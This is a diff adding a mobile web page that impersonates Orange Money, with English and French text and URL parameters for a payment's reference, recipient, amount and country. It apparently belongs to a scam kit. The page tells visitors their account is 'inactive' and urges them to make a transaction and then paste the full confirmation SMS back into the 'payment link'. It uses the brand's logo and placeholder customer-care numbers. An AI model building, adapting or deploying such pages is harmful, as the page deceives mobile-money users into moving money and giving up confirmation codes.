@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Orange Money · Account Inactive</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --om-primary:   #FF7900;
+    --om-primary-dark: #E55A00;
+    --om-royal:     #FF9D2E;
+    --om-navy:      #0F1A2B;
+    --om-soft-orange:#FFF4EB;
+    --om-soft:      #F7F8FA;
+    --om-border:    #E8EAEE;
+    --om-text:      #1A2233;
+    --om-muted:     #5B6577;
+    --om-white:     #FFFFFF;
+    --om-page:      #F5F6F8;
+    --om-green:     #0E7A4A;
+    --om-gold:      #FFB81C;
+    --om-amber:     #D97706;
+    --om-amber-soft:#FFF7ED;
+    --om-amber-border:#FED7AA;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--om-page); color: var(--om-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: var(--om-white); display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+
+  /* ─── TOP ─── */
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(160deg, var(--om-primary) 0%, var(--om-royal) 100%);
+    padding: 20px 22px 26px;
+    border-bottom-left-radius: 20px;
+    border-bottom-right-radius: 20px;
+  }
+  .top::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
+    background: var(--om-gold);
+    border-top-left-radius: 20px; border-top-right-radius: 20px;
+  }
+  .brand-row { display: flex; align-items: center; gap: 10px; }
+  .top-logo { height: 34px; width: auto; display: block; flex-shrink: 0; }
+  .brand-text {
+    font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
+    color: #fff; line-height: 1; white-space: nowrap;
+  }
+  .brand-text .dot { color: var(--om-gold); }
+
+  .page-title {
+    margin-top: 18px; font-size: 19px; font-weight: 800;
+    color: #fff; letter-spacing: -0.3px; line-height: 1.25;
+  }
+  .page-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.85);
+    line-height: 1.55; max-width: 320px;
+  }
+
+  /* ─── BODY ─── */
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 24px 20px 22px;
+    display: flex; flex-direction: column;
+  }
+
+  .hero-icon {
+    width: 72px; height: 72px; border-radius: 50%;
+    background: var(--om-amber);
+    display: inline-flex; align-items: center; justify-content: center;
+    margin: 0 auto 18px;
+    box-shadow: 0 0 0 6px rgba(217,119,6,0.12),
+                0 10px 22px rgba(217,119,6,0.28);
+  }
+  .hero-icon svg {
+    width: 36px; height: 36px;
+    stroke: #fff; fill: none;
+    stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .status-title {
+    font-size: 19px; font-weight: 800; letter-spacing: -0.3px;
+    color: var(--om-navy); text-align: center;
+    line-height: 1.3; margin-bottom: 8px;
+  }
+  .status-desc {
+    font-size: 13px; color: var(--om-muted); line-height: 1.6;
+    text-align: center; max-width: 320px; margin: 0 auto 20px;
+  }
+
+  .notice-box {
+    background: var(--om-amber-soft);
+    border: 1px solid var(--om-amber-border);
+    border-left: 3px solid var(--om-amber);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-size: 12.5px;
+    color: #7C2D12;
+    line-height: 1.65;
+    margin-bottom: 20px;
+  }
+  .notice-box strong {
+    color: #9A3412; font-weight: 800; display: block;
+    margin-bottom: 8px; font-size: 13px;
+  }
+  .notice-box ol {
+    margin: 0; padding-left: 18px;
+  }
+  .notice-box ol li {
+    margin-bottom: 6px;
+  }
+  .notice-box ol li:last-child {
+    margin-bottom: 0;
+  }
+  .notice-box .foot-note {
+    display: block;
+    margin-top: 8px;
+    font-size: 11.5px;
+    color: #9A3412;
+    line-height: 1.55;
+  }
+
+  .detail-list {
+    background: var(--om-soft);
+    border: 1px solid var(--om-border);
+    border-radius: 12px;
+    padding: 4px 16px;
+    margin-bottom: 22px;
+  }
+  .detail-row {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    padding: 12px 0; border-bottom: 1px solid #EDF0F4;
+    font-size: 12.5px; gap: 12px;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-row .k { color: var(--om-muted); flex-shrink: 0; font-weight: 500; }
+  .detail-row .v {
+    font-weight: 700; text-align: right;
+    word-break: break-word; color: var(--om-text);
+  }
+  .detail-row .v.status-warn { color: var(--om-amber); font-weight: 700; }
+
+  /* Footer */
+  .om-footer {
+    width: 100%; margin-top: 4px;
+    background: var(--om-navy);
+    border-radius: 12px;
+    padding: 16px 18px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; text-align: left;
+  }
+  .foot-brand-row { display: flex; align-items: center; gap: 8px; }
+  .om-footer .foot-logo {
+    height: 26px; width: auto; display: block; flex-shrink: 0;
+  }
+  .om-footer .foot-brand-text {
+    font-size: 16px; font-weight: 800; letter-spacing: -0.3px;
+    color: #fff; line-height: 1; white-space: nowrap;
+  }
+  .om-footer .foot-brand-text .dot { color: var(--om-primary); }
+  .om-footer .foot-support {
+    font-size: 10.5px; color: rgba(255,255,255,0.72); line-height: 1.5; font-weight: 500;
+    text-align: right;
+  }
+  .om-footer .foot-support strong {
+    color: var(--om-primary); font-weight: 700; font-size: 11.5px;
+  }
+
+  /* Close button */
+  .close-btn {
+    width: 100%; margin-top: 18px; min-height: 64px;
+    background: var(--om-primary); color: #fff;
+    border: none; border-radius: 12px;
+    font-family: inherit; font-size: 17px; font-weight: 800;
+    letter-spacing: 0.4px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(255,121,0,0.28);
+    transition: filter .15s, transform .1s;
+    display: flex; align-items: center; justify-content: center;
+    padding: 18px 24px;
+    -webkit-tap-highlight-color: transparent;
+    touch-action: manipulation;
+  }
+  .close-btn:hover { filter: brightness(1.06); }
+  .close-btn:active { transform: scale(0.985); }
+
+  /* Toast */
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: var(--om-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+    box-shadow: 0 12px 28px rgba(0,0,0,0.25);
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 20px 18px 18px; }
+    .top-logo { height: 30px; }
+    .brand-text { font-size: 20px; }
+    .page-title { font-size: 17px; }
+    .hero-icon { width: 62px; height: 62px; }
+    .hero-icon svg { width: 30px; height: 30px; }
+    .status-title { font-size: 17px; }
+    .close-btn { min-height: 60px; font-size: 16px; }
+    .om-footer { padding: 14px 16px; }
+    .om-footer .foot-logo { height: 22px; }
+    .om-footer .foot-brand-text { font-size: 14px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 20px;
+      box-shadow: 0 30px 80px rgba(255,121,0,0.18);
+      overflow: hidden;
+    }
+  }
+  @media print {
+    body { background: #fff; padding: 0; }
+    .close-btn, .om-footer { display: none !important; }
+    .phone { box-shadow: none; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="top">
+    <div class="brand-row">
+      <img
+        class="top-logo"
+        src="https://cdn.brandfetch.io/id29r8rnyj/theme/light/logo.svg?c=1dxbfHSJFAPEGdCLU4o5B"
+        alt="Orange Money"
+        referrerpolicy="no-referrer"
+        onerror="this.style.display='none'"
+      >
+      <span class="brand-text">Orange<span class="dot">.</span></span>
+    </div>
+    <div class="page-title" id="pageTitle">Account inactive</div>
+    <div class="page-sub" id="pageSub">This Orange Money account is currently inactive. Complete a transaction on your account to reactivate it, then try receiving again.</div>
+  </div>
+
+  <div class="body">
+
+    <div class="hero-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24">
+        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+        <line x1="12" y1="9" x2="12" y2="13"/>
+        <line x1="12" y1="17" x2="12.01" y2="17"/>
+      </svg>
+    </div>
+
+    <div class="status-title" id="statusTitle">Account inactive</div>
+    <div class="status-desc" id="statusDesc">
+      This Orange Money account is currently inactive. To reactivate it and receive this payment, please complete a transaction on your account.
+    </div>
+
+    <div class="notice-box" id="noticeBox">
+      <strong id="noticeTitle">What should you do?</strong>
+      <ol id="noticeSteps">
+        <li><strong>Make a transaction</strong> on your Orange Money account (transfer, deposit, or pay a bill)</li>
+        <li>Wait for the <strong>confirmation message</strong> from Orange Money</li>
+        <li>Come back to this page and <strong>tap "Confirm transfer" again</strong></li>
+      </ol>
+      <span class="foot-note" id="noticeFoot">If your account is still inactive after a transaction, contact Orange Money customer care or visit your nearest Orange service centre with your ID.</span>
+    </div>
+
+    <div class="detail-list">
+      <div class="detail-row"><span class="k" id="kTransaction">Reference</span><span class="v" id="txId">—</span></div>
+      <div class="detail-row"><span class="k" id="kRecipient">Recipient</span><span class="v" id="recipientName">—</span></div>
+      <div class="detail-row"><span class="k" id="kAmount">Amount</span><span class="v" id="amountLabel">—</span></div>
+      <div class="detail-row"><span class="k" id="kCountry">Country</span><span class="v" id="countryLabel">—</span></div>
+      <div class="detail-row"><span class="k" id="kStatus">Status</span><span class="v status-warn" id="statusLabel">Account inactive</span></div>
+    </div>
+
+    <div class="om-footer">
+      <div class="foot-brand-row">
+        <img
+          class="foot-logo"
+          src="https://cdn.brandfetch.io/id29r8rnyj/theme/light/logo.svg?c=1dxbfHSJFAPEGdCLU4o5B"
+          alt="Orange Money"
+          referrerpolicy="no-referrer"
+          onerror="this.style.display='none'"
+        >
+        <span class="foot-brand-text">Orange<span class="dot">.</span></span>
+      </div>
+      <div class="foot-support">
+        <span id="needHelpLabel">Customer Care</span><br>
+        <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
+      </div>
+    </div>
+
+    <button class="close-btn" onclick="closePage()" id="closeBtn">Close</button>
+
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const I18N = {
+    en: {
+      docTitle: 'Orange Money · Account Inactive',
+      pageTitle: 'Account inactive',
+      pageSub: 'This Orange Money account is currently inactive. Complete a transaction on your account to reactivate it, then try receiving again.',
+      statusTitle: 'Account inactive',
+      statusDesc: 'This Orange Money account is currently inactive. To reactivate it and receive this payment, please complete a transaction on your account.',
+      noticeTitle: 'What should you do?',
+      noticeSteps: [
+        '<strong>Make a transaction</strong> on your Orange Money account (transfer, deposit, or pay a bill)',
+        'Wait for the <strong>confirmation message</strong> from Orange Money',
+        'Come back to this page and <strong>tap "Confirm transfer" again</strong>'
+      ],
+      noticeFoot: 'If your account is still inactive after a transaction, contact Orange Money customer care or visit your nearest Orange service centre with your ID.',
+      kTransaction: 'Reference',
+      kRecipient: 'Recipient',
+      kAmount: 'Amount',
+      kCountry: 'Country',
+      kStatus: 'Status',
+      statusLabel: 'Account inactive',
+      needHelp: 'Customer Care',
+      callLabel: 'Call',
+      close: 'Close',
+      noticeTitleFullSms: 'Account inactive',
+      statusDescFullSms: 'The confirmation message you submitted was incomplete and this account is currently inactive. Complete a transaction on your account to reactivate it.',
+      noticeStepsFullSms: [
+        '<strong>Make a transaction</strong> on your Orange Money account (transfer, deposit, or pay a bill)',
+        'Wait for the <strong>confirmation message</strong> from Orange Money',
+        'Come back to the payment link and <strong>paste the full confirmation message</strong>'
+      ]
+    },
+    fr: {
+      docTitle: 'Orange Money · Compte inactif',
+      pageTitle: 'Compte inactif',
+      pageSub: 'Ce compte Orange Money est actuellement inactif. Effectuez une transaction sur votre compte pour le réactiver, puis réessayez de recevoir.',
+      statusTitle: 'Compte inactif',
+      statusDesc: 'Ce compte Orange Money est actuellement inactif. Pour le réactiver et recevoir ce paiement, veuillez effectuer une transaction sur votre compte.',
+      noticeTitle: 'Que devez-vous faire ?',
+      noticeSteps: [
+        '<strong>Effectuez une transaction</strong> sur votre compte Orange Money (virement, dépôt ou paiement de facture)',
+        'Attendez le <strong>message de confirmation</strong> d\'Orange Money',
+        'Revenez sur cette page et <strong>appuyez à nouveau sur « Confirmer le virement »</strong>'
+      ],
+      noticeFoot: 'Si votre compte est toujours inactif après une transaction, contactez le service client Orange Money ou visitez votre agence Orange la plus proche avec votre pièce d\'identité.',
+      kTransaction: 'Référence',
+      kRecipient: 'Destinataire',
+      kAmount: 'Montant',
+      kCountry: 'Pays',
+      kStatus: 'Statut',
+      statusLabel: 'Compte inactif',
+      needHelp: 'Service Client',
+      callLabel: 'Appelez le',
+      close: 'Fermer',
+      noticeTitleFullSms: 'Compte inactif',
+      statusDescFullSms: 'Le message de confirmation que vous avez soumis était incomplet et ce compte est actuellement inactif. Effectuez une transaction sur votre compte pour le réactiver.',
+      noticeStepsFullSms: [
+        '<strong>Effectuez une transaction</strong> sur votre compte Orange Money (virement, dépôt ou paiement de facture)',
+        'Attendez le <strong>message de confirmation</strong> d\'Orange Money',
+        'Revenez sur le lien de paiement et <strong>collez le message de confirmation complet</strong>'
+      ]
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  const currentLang = I18N[urlLang] ? urlLang : 'en';
+  const T = I18N[currentLang];
+
+  const SUPPORT_NUMBERS = {
+    'Botswana': '1234',
+    'Botswana (Orange)': '1234',
+    'Cameroon': '8787',
+    'Zambia': '111',
+    'Uganda': '100',
+    'Ghana': '100',
+    'Benin': '111'
+  };
+
+  const CURRENCY_LOCALE = {
+    BWP: 'en-BW', ZAR: 'en-ZA', USD: 'en-US', EUR: 'en-EU',
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
+    XOF: 'fr-BJ'
+  };
+
+  function formatAmount(amount, currency) {
+    const locale = CURRENCY_LOCALE[currency] || 'en-BW';
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    try {
+      const parts = new Intl.NumberFormat(locale, {
+        minimumFractionDigits: 0, maximumFractionDigits: 2
+      }).format(n);
+      return parts + ' ' + currency;
+    } catch (e) { return n + ' ' + (currency || ''); }
+  }
+
+  const tx = {
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    dt:  urlParams.get('dt') || '',
+    pu:  urlParams.get('pu') || '',
+    reason: urlParams.get('reason') || ''
+  };
+
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('statusTitle').textContent = T.statusTitle;
+    document.getElementById('statusDesc').textContent = T.statusDesc;
+    document.getElementById('noticeTitle').textContent = T.noticeTitle;
+    document.getElementById('noticeFoot').textContent = T.noticeFoot;
+    document.getElementById('kTransaction').textContent = T.kTransaction;
+    document.getElementById('kRecipient').textContent = T.kRecipient;
+    document.getElementById('kAmount').textContent = T.kAmount;
+    document.getElementById('kCountry').textContent = T.kCountry;
+    document.getElementById('kStatus').textContent = T.kStatus;
+    document.getElementById('statusLabel').textContent = T.statusLabel;
+    document.getElementById('needHelpLabel').textContent = T.needHelp;
+    document.getElementById('callLabel').textContent = T.callLabel;
+    document.getElementById('closeBtn').textContent = T.close;
+
+    const ol = document.getElementById('noticeSteps');
+    if (ol) {
+      ol.innerHTML = T.noticeSteps.map(s => '<li>' + s + '</li>').join('');
+    }
+  }
+
+  function populate() {
+    applyTranslations();
+
+    document.getElementById('txId').textContent = tx.ref || '—';
+    document.getElementById('recipientName').textContent = tx.rn || '—';
+    document.getElementById('amountLabel').textContent =
+      tx.am ? formatAmount(tx.am, tx.cur) : '—';
+    document.getElementById('countryLabel').textContent = tx.c || '—';
+    document.getElementById('supportNum').textContent =
+      SUPPORT_NUMBERS[tx.c] || '—';
+
+    if (tx.reason === 'needs_full_sms') {
+      document.getElementById('statusTitle').textContent = T.noticeTitleFullSms;
+      document.getElementById('statusDesc').textContent = T.statusDescFullSms;
+      document.getElementById('statusLabel').textContent = T.statusLabel;
+      const ol = document.getElementById('noticeSteps');
+      if (ol) {
+        ol.innerHTML = T.noticeStepsFullSms.map(s => '<li>' + s + '</li>').join('');
+      }
+    }
+  }
+
+  function closePage() {
+    if (tx.ref) {
+      try {
+        const base = new URL('index.html', window.location.href);
+        base.search = '?r=' + encodeURIComponent(tx.ref) + '&lang=' + encodeURIComponent(currentLang);
+        base.hash = '';
+        window.location.href = base.toString();
+        return;
+      } catch (e) {}
+    }
+    if (history.length > 1) {
+      history.back();
+    } else {
+      window.location.href = 'index.html';
+    }
+  }
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') closePage();
+  });
+
+  document.addEventListener('DOMContentLoaded', populate);
+</script>
+</body>
+</html>
